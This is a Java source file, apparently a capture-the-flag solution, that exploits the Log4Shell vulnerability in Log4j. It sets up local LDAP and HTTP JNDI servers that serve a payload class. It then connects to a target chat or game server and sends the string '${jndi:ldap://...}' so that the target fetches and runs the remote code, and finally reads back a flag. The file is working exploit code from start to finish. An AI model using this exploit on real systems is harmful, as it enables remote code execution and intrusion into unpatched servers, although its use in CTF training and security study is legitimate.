package fr.thesmyler.log4shell;

import fr.thesmyler.log4shell.payloads.GetFlagPayload;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.*;
import java.net.Socket;
import java.net.URL;

import static fr.thesmyler.log4shell.Util.randomAlphaNumString;

public class ExploitTester {

    public static final Logger LOGGER = LogManager.getLogger("Exploit");
    private final String host;
    private final int port;
    private final String localHost;
    private final int ldapPort;
    private final int httpPort;

    public ExploitTester(String host, int port, String localHost, int ldapPort, int httpPort) {
        this.host = host;
        this.port = port;
        this.localHost = localHost;
        this.ldapPort = ldapPort;
        this.httpPort = httpPort;
    }

    public String getFlag() throws Exception {
        HttpJndiServer httpServer = HttpJndiServer.instance();
        httpServer.addConnector("0.0.0.0", this.httpPort);
        httpServer.setDefaultPayload(GetFlagPayload.class);
        URL url = new URL("http://" + this.localHost + ":" + this.httpPort);
        LdapJndiServer ldapServer = new LdapJndiServer("0.0.0.0", this.ldapPort, url);
        httpServer.start();
        ldapServer.start();
        LOGGER.info("Connecting...");
        try (Socket socket = new Socket(this.host, this.port)) {
            BufferedReader sc = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintStream out = new PrintStream(socket.getOutputStream());
            //waitUntilLineContains(sc, "username");
            LOGGER.info("Connected");
            out.println(randomAlphaNumString(8));
            waitUntilLineContains(sc, "has joined the game");
            LOGGER.info("Logged in");
            out.println("${jndi:ldap://" + this.localHost + ":" + this.ldapPort + "/" + randomAlphaNumString(8) + "}");
            Thread.sleep(1000);
            out.println("/exploit");
            while (true) {
                String line = sc.readLine();
                if (line.contains("404")) {
                    return line;
                }
            }
        }
    }

    private static void waitUntilLineContains(BufferedReader scanner, String str) throws IOException {
        String line = "";
        while (!line.contains(str)) {
            line = scanner.readLine();
        }
    }

}
